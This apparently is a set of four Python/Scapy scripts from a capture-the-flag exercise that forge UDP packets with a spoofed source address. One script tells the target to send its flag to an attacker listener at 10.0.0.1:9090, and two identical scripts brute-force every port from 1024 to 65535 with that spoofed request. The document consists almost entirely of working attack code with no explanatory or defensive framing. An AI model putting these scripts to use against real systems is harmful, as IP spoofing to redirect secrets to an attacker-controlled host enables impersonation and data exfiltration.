# UDP 1
from scapy.all import IP, send, UDP 
import time

target_ip = "10.0.0.2"
target_port = 31338

spoofed_ip = "10.0.0.3"
spoofed_port = 31337


network_layer= IP(src=spoofed_ip,dst=target_ip)
trans_layer= UDP(sport=spoofed_port, dport=target_port)
data= b"FLAG"
packet= network_layer / trans_layer /data

#send(packet)
print('Message Sent! ')
send(packet, verbose=False)
#time.sleep(0.1)

##########################################
#  UDP 2

from scapy.all import IP, send, UDP 
import time

# target the client_server its own the flag rap it to think you are the main server and sent the flag to the ip after : 
target_ip = "10.0.0.2"
target_port = 31338

spoofed_ip = "10.0.0.3"
spoofed_port = 31337


network_layer= IP(src=spoofed_ip,dst=target_ip)
trans_layer= UDP(sport=spoofed_port, dport=target_port)
data= b"FLAG:10.0.0.1:9090"

packet= network_layer / trans_layer /data
send(packet)
print('Exploit Sent! Check your listener on 9090 or dump the traffic.')


#########################################
# UDP 3

from scapy.all import IP, send, UDP 
import time


target_ip = "10.0.0.2"

spoofed_ip = "10.0.0.3"
spoofed_port = 31337

print("start Brute-Forece on target port ")
for port in range(1024,65535,1):

        network_layer= IP(src=spoofed_ip,dst=target_ip)
        trans_layer= UDP(sport=spoofed_port, dport=port)
        data= b"FLAG:10.0.0.1:9090"

        packet= network_layer / trans_layer /data
        send(packet, verbose=False)

        if port % 1000==0:
                print(f"Start Scaning  all ports: {port}.... ")







##########################################
#UDP 4

from scapy.all import IP, send, UDP 
import time


target_ip = "10.0.0.2"

spoofed_ip = "10.0.0.3"
spoofed_port = 31337

print("start Brute-Forece on target port ")
for port in range(1024,65535,1):

        network_layer= IP(src=spoofed_ip,dst=target_ip)
        trans_layer= UDP(sport=spoofed_port, dport=port)
        data= b"FLAG:10.0.0.1:9090"

        packet= network_layer / trans_layer /data
        send(packet, verbose=False)

        if port % 1000==0:
                print(f"Start Scaning  all ports: {port}.... ")














###################################################
